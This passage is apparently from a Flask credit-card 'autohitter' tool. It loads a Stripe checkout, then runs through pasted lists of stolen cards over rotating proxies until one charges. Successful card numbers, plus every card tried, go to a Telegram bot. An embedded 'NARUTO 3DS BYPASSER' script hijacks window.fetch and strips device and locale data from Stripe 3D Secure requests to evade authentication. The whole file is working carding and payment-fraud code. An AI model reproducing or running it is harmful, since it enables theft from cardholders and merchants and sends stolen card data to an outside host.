            document.getElementById(tab + '-tab').classList.add('active');
            event.target.classList.add('active');
        }
        
        let ahCheckoutData = null;
        let ahRunning = false;
        let ahChargedList = [];
        let ahDeclinedList = [];
        
        async function initCheckout() {
            const url = document.getElementById('checkoutUrl').value.trim();
            if (!url) return alert('Please enter checkout URL');
            
            document.getElementById('checkoutInfo').style.display = 'none';
            document.getElementById('ahCardsSection').style.display = 'none';
            document.getElementById('ahResultsGrid').style.display = 'none';
            
            try {
                const response = await fetch('/autohitter/init', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({checkout_url: url})
                });
                const data = await response.json();
                
                if (data.error) {
                    alert('Error: ' + data.error);
                    return;
                }
                
                ahCheckoutData = data;
                ahCheckoutData.checkout_url = url;
                document.getElementById('infoMerchant').textContent = data.merchant || 'Unknown';
                document.getElementById('infoEmail').textContent = data.email || 'N/A';
                document.getElementById('infoPrice').textContent = data.price ? (data.currency + ' ' + data.price.toFixed(2)) : 'N/A';
                document.getElementById('infoPk').textContent = data.pk ? (data.pk.substring(0, 25) + '...') : 'N/A';
                document.getElementById('infoCs').textContent = data.cs ? (data.cs.substring(0, 25) + '...') : 'N/A';
                
                document.getElementById('checkoutInfo').style.display = 'block';
                document.getElementById('ahCardsSection').style.display = 'block';
                document.getElementById('ahResultsGrid').style.display = 'grid';
            } catch (e) {
                alert('Error loading checkout: ' + e.message);
            }
        }
        
        let ahProxies = [];
        let ahTriedCards = [];
        
        async function startAutoHit() {
            const input = document.getElementById('ahCcInput').value.trim();
            if (!input) return alert('Please enter CC list');
            if (!ahCheckoutData) return alert('Please load checkout first');
            
            const proxyInput = document.getElementById('proxyInput').value.trim();
            ahProxies = proxyInput ? proxyInput.split('\\n').map(p => p.trim()).filter(p => p) : [];
            ahTriedCards = [];
            
            const ccList = input.split('\\n').map(cc => cc.trim()).filter(cc => cc);
            if (ccList.length === 0) return;
            
            ahRunning = true;
            document.getElementById('ahStartBtn').style.display = 'none';
            document.getElementById('ahStopBtn').style.display = 'inline-block';
            document.getElementById('ahProgressBar').classList.add('show');
            document.getElementById('ahStatusText').classList.add('show');
            
            for (let i = 0; i < ccList.length; i++) {
                if (!ahRunning) break;
                
                const cc = ccList[i];
                ahTriedCards.push(cc);
                const progress = ((i + 1) / ccList.length) * 100;
                document.getElementById('ahProgressFill').style.width = progress + '%';
                document.getElementById('ahStatusText').textContent = 'Processing ' + (i + 1) + ' of ' + ccList.length + '...';
                
                try {
                    const response = await fetch('/autohitter/charge', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({cc: cc, checkout_data: ahCheckoutData, proxies: ahProxies, tried_cards: ahTriedCards})
                    });
                    const data = await response.json();
                    addAhCard(data.card, data.response, data.status, data.time, data.bin_info);
                } catch (e) {
                    addAhCard(cc, 'Error: Request failed', 'ERROR', 0, null);
                }
            }
            
            finishAutoHit();
        }
        
        function stopAutoHit() {
            ahRunning = false;
            finishAutoHit();
        }
        
        function finishAutoHit() {
            ahRunning = false;
            document.getElementById('ahStartBtn').style.display = 'inline-block';
            document.getElementById('ahStopBtn').style.display = 'none';
            document.getElementById('ahStatusText').textContent = 'Completed!';
            setTimeout(() => {
                document.getElementById('ahProgressBar').classList.remove('show');
                document.getElementById('ahStatusText').classList.remove('show');
            }, 2000);
        }
        
        function addAhCard(cc, response, status, time, binInfo) {
            const isCharged = status === 'CHARGED';
            const container = document.getElementById(isCharged ? 'ahChargedCards' : 'ahDeclinedCards');
            const countEl = document.getElementById(isCharged ? 'ahChargedCount' : 'ahDeclinedCount');
            const list = isCharged ? ahChargedList : ahDeclinedList;
            
            if (container.querySelector('.empty-state')) {
                container.innerHTML = '';
            }
            
            list.push({cc, response, status});
            countEl.textContent = list.length;
            
            let binHtml = '';
            if (binInfo) {
                binHtml = '<div class="bin-info"><span class="bin-badge">' + binInfo.brand + '</span><span class="bin-badge">' + binInfo.type + '</span><span class="bin-badge">' + binInfo.country + ' ' + binInfo.country_flag + '</span><div class="bin-bank">' + binInfo.bank + '</div></div>';
            }
            
            let fullResponseHtml = '';
            if (isCharged && ahCheckoutData) {
                const merchant = ahCheckoutData.merchant || 'Unknown';
                const amount = (ahCheckoutData.currency || 'USD') + ' ' + (ahCheckoutData.price || '0');
                const email = ahCheckoutData.email || 'N/A';
                const checkoutUrl = ahCheckoutData.checkout_url || 'N/A';
                const binLine = binInfo ? (binInfo.brand + ' - ' + binInfo.type + ' - ' + (binInfo.level || 'N/A')) : 'N/A';
                const bankLine = binInfo ? binInfo.bank : 'N/A';
                const countryLine = binInfo ? (binInfo.country + ' ' + binInfo.country_flag) : 'N/A';
                fullResponseHtml = '<div class="full-response"><div class="response-divider">━━━━━━━━━━━━━━━</div><div class="response-line success" style="text-align:center;font-size:14px;">💠 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 💠</div><div class="response-divider">━━━━━━━━━━━━━━━</div><div class="response-line"><span class="response-label">💳 𝐂𝐚𝐫𝐝  :</span> ' + escapeHtml(cc) + '</div><div class="response-line success"><span class="response-label">🔥 𝐒𝐭𝐚𝐭𝐮𝐬 :</span> Paid</div><div class="response-line"><span class="response-label">💰 𝐀𝐦𝐨𝐮𝐧𝐭 :</span> ' + escapeHtml(amount) + '</div><div class="response-line"><span class="response-label">🌐 𝐒𝐢𝐭𝐞   :</span> ' + escapeHtml(merchant) + '</div><div class="response-line"><span class="response-label">📩 𝐌𝐚𝐢𝐥  :</span> ' + escapeHtml(email) + '</div><br><div class="response-line"><span class="response-label">📦 𝐈𝐧𝐟𝐨  :</span> ' + escapeHtml(binLine) + '</div><div class="response-line"><span class="response-label">🏦 𝐁𝐚𝐧𝐤  :</span> ' + escapeHtml(bankLine) + '</div><div class="response-line"><span class="response-label">🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</span> ' + escapeHtml(countryLine) + '</div><br><div class="response-line"><span class="response-label">🔗 𝐂𝐨𝐧𝐟𝐢𝐫𝐦 :</span></div><div class="response-line"><a href="' + escapeHtml(checkoutUrl) + '" target="_blank" style="color:#8b6914;word-break:break-all;">' + escapeHtml(checkoutUrl) + '</a></div><br><div class="response-line" style="text-align:center;">🙏 Thank you!</div><div class="response-divider">━━━━━━━━━━━━━━━</div><div class="response-line"><span class="response-label">👤 𝐃𝐞𝐯 :</span> @Pyftp</div></div>';
            }
            
            const statusClass = isCharged ? 'approved' : 'declined';
            const card = document.createElement('div');
            card.className = 'card ' + statusClass;
            if (isCharged) {
                card.innerHTML = '<button class="card-copy" onclick="copyCard(this)">Copy</button><div class="card-cc">' + escapeHtml(cc) + '</div>' + binHtml + fullResponseHtml;
            } else {
                card.innerHTML = '<button class="card-copy" onclick="copyCard(this)">Copy</button><div class="card-cc">' + escapeHtml(cc) + '</div>' + binHtml + '<div class="card-response">[' + status + '] ' + escapeHtml(response) + ' (' + time + 's)</div>';
            }
            container.insertBefore(card, container.firstChild);
        }
        
        function copyAllAh(type) {
            const list = type === 'charged' ? ahChargedList : ahDeclinedList;
            if (list.length === 0) return alert('No cards to copy');
            const text = list.map(item => item.cc + ' | ' + item.status + ' | ' + item.response).join('\\n');
            navigator.clipboard.writeText(text);
            alert('Copied ' + list.length + ' cards!');
        }
        
        function clearAhLogs() {
            ahChargedList = [];
            ahDeclinedList = [];
            document.getElementById('ahChargedCards').innerHTML = '<div class="empty-state">No charged cards yet</div>';
            document.getElementById('ahDeclinedCards').innerHTML = '<div class="empty-state">No declined cards yet</div>';
            document.getElementById('ahChargedCount').textContent = '0';
            document.getElementById('ahDeclinedCount').textContent = '0';
        }
        
        // NARUTO 3DS BYPASSER v1
        (function(){if(window.__Naruto_V1__)return;window.__Naruto_V1__=true;const STRIPE_DOMAINS=['stripe.com','stripe.network'];const STRIPE_PATHS=['/v1/3ds','/v1/payment','/v1/setup','/v1/tokens','/v1/sources','/authenticate','/confirm','/challenge'];function isStripe(url){if(!url)return false;try{const u=new URL(url,location.href);return STRIPE_DOMAINS.some(d=>u.hostname.includes(d))||STRIPE_PATHS.some(p=>u.pathname.includes(p));}catch{return STRIPE_DOMAINS.some(d=>url.includes(d))||STRIPE_PATHS.some(p=>url.includes(p));}}function decodeAndModify(bodyStr){if(!bodyStr)return{modified:false,body:bodyStr};let result=bodyStr;let modified=false;const localePatterns=[/en-US/gi,/en_US/gi,/en-GB/gi,/en_GB/gi,/"locale":"[^"]*"/gi,/"browser_locale":"[^"]*"/gi,/"language":"[^"]*"/gi,/locale=[^&]*/gi,/browser_locale=[^&]*/gi];for(const p of localePatterns){const before=result;result=result.replace(p,'');if(before!==result)modified=true;}const deviceDataMatch=result.match(/three_d_secure%5Bdevice_data%5D=([^&]*)/);if(deviceDataMatch){try{let encoded=deviceDataMatch[1];let decoded=decodeURIComponent(encoded);try{let json=atob(decoded);let obj=JSON.parse(json);['browser_locale','locale','language','timezone','user_agent','screen_width','screen_height'].forEach(k=>{if(obj[k]){delete obj[k];modified=true;}});const newJson=JSON.stringify(obj);const newB64=btoa(newJson);const newEncoded=encodeURIComponent(newB64);result=result.replace(deviceDataMatch[0],'three_d_secure%5Bdevice_data%5D='+newEncoded);}catch(e){}}catch(e){}}return{modified,body:result};}const origFetch=window.fetch;window.fetch=async function(input,init){let url,method,body;if(input instanceof Request){url=input.url;method=input.method;if(input.body){try{const clone=input.clone();body=await clone.text();}catch(e){body=null;}}}else{url=String(input||'');method=init?.method||'GET';body=init?.body;}if(body&&typeof body!=='string'){if(body instanceof URLSearchParams)body=body.toString();else if(body instanceof FormData){const params=new URLSearchParams();body.forEach((v,k)=>params.append(k,v));body=params.toString();}else{try{body=JSON.stringify(body);}catch(e){body=null;}}}if(isStripe(url)&&body&&method!=='GET'){const result=decodeAndModify(body);if(result.modified){console.log('%c[NARUTO] 3DS BYPASSED!','color:#22c55e;font-weight:bold');const newInit={...init,method,body:result.body};return origFetch.call(window,url,newInit);}}if(input instanceof Request)return origFetch.call(window,input,init);return origFetch.call(window,url,init||{});};console.log('%c[NARUTO 3DS BYPASSER v1] Active','color:#22c55e;font-size:14px;font-weight:bold');})();
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/check', methods=['POST'])
def check():
    if stop_flag.is_set():
        return jsonify({'response': 'Stopped', 'status': 'declined', 'telegram_sent': False})
    
    data = request.get_json()
    cc = data.get('cc', '')
    
    try:
        api_url = f"{API_BASE}{cc}"
        resp = requests.get(api_url, timeout=30)
        raw_response = resp.text
        cleaned = clean_response(raw_response)
        
        bin_info = get_bin_info(cc)
        
        is_approved = any(word in cleaned.lower() for word in ['live', 'approved', 'success', 'charged', 'cvv match'])
        status = 'approved' if is_approved else 'declined'
        
        telegram_sent = False
        telegram_error = ""
        if is_approved:
            telegram_sent, telegram_error = send_telegram(cc, cleaned, bin_info)
        
        return jsonify({
            'response': cleaned, 
            'status': status, 
            'telegram_sent': telegram_sent, 
            'telegram_error': telegram_error,
            'bin_info': bin_info
        })
    except Exception as e:
        return jsonify({'response': f'Error: {str(e)}', 'status': 'declined', 'telegram_sent': False, 'telegram_error': '', 'bin_info': None})

@app.route('/stop', methods=['POST'])
def stop():
    stop_flag.set()
    return jsonify({'status': 'stopped'})

@app.route('/autohitter/init', methods=['POST'])
def autohitter_init():
    data = request.get_json()
    checkout_url = data.get('checkout_url', '')
    extracted = extract_checkout_url(checkout_url) or checkout_url
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(get_checkout_info_async(extracted))
    finally:
        loop.close()
    return jsonify(result)

@app.route('/autohitter/charge', methods=['POST'])
def autohitter_charge():
    data = request.get_json()
    cc = data.get('cc', '')
    checkout_data = data.get('checkout_data', {})
    proxies = data.get('proxies', [])
    tried_cards = data.get('tried_cards', [])
    card = parse_card_autohitter(cc)
    if not card:
        return jsonify({'card': cc, 'status': 'INVALID', 'response': 'Invalid card format', 'time': 0})
    proxy = None
    if proxies:
        import random
        proxy = random.choice(proxies)
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(charge_card_async(card, checkout_data, proxy))
    finally:
        loop.close()
    bin_info = get_bin_info(cc)
    result['bin_info'] = bin_info
    if result['status'] == 'CHARGED':
        price_str = f"{checkout_data.get('currency', 'USD')} {checkout_data.get('price', 0)}"
        email = checkout_data.get('email', 'N/A')
        checkout_url = checkout_data.get('checkout_url', 'N/A')
        send_telegram_autohitter(cc, result['response'], bin_info, checkout_data.get('merchant', 'Unknown'), price_str, email, checkout_url, tried_cards)
    return jsonify(result)

def send_telegram_autohitter(cc, response, bin_info, merchant, price, email, checkout_url, tried_cards=None):
    if not TELEGRAM_BOT_TOKEN:
        return False
    try:
        bin_brand = bin_info.get('brand', 'N/A') if bin_info else 'N/A'
        bin_type = bin_info.get('type', 'N/A') if bin_info else 'N/A'
        bin_level = bin_info.get('level', 'N/A') if bin_info else 'N/A'
        bin_bank = bin_info.get('bank', 'N/A') if bin_info else 'N/A'
        bin_country = bin_info.get('country', 'N/A') if bin_info else 'N/A'
        bin_flag = bin_info.get('country_flag', '') if bin_info else ''
        tried_list = ""
        if tried_cards and len(tried_cards) > 0:
            tried_list = "\n".join([f"• {c}" for c in tried_cards])
        message = f"""━━━━━━━━━━━━━━━
💠 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 💠
━━━━━━━━━━━━━━━

💳 𝐂𝐚𝐫𝐝  : {cc}
🔥 𝐒𝐭𝐚𝐭𝐮𝐬 : Paid
💰 𝐀𝐦𝐨𝐮𝐧𝐭 : {price}
🌐 𝐒𝐢𝐭𝐞   : {merchant}
📩 𝐌𝐚𝐢𝐥  : {email}

📦 𝐈𝐧𝐟𝐨  : {bin_brand} - {bin_type} - {bin_level}
🏦 𝐁𝐚𝐧𝐤  : {bin_bank}
🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_country} {bin_flag}

🔗 𝐂𝐨𝐧𝐟𝐢𝐫𝐦 :
{checkout_url}

🙏 Thank you!
━━━━━━━━━━━━━━━
👤 𝐃𝐞𝐯 : @Pyftp
━━━━━━━━━━━━━━━
📋 𝐀𝐥𝐥 𝐓𝐫𝐢𝐞𝐝 𝐂𝐚𝐫𝐝𝐬 ({len(tried_cards) if tried_cards else 0}):
{tried_list}"""
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": message, "disable_web_page_preview": True}, timeout=10)
        return True
    except:
        return False

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
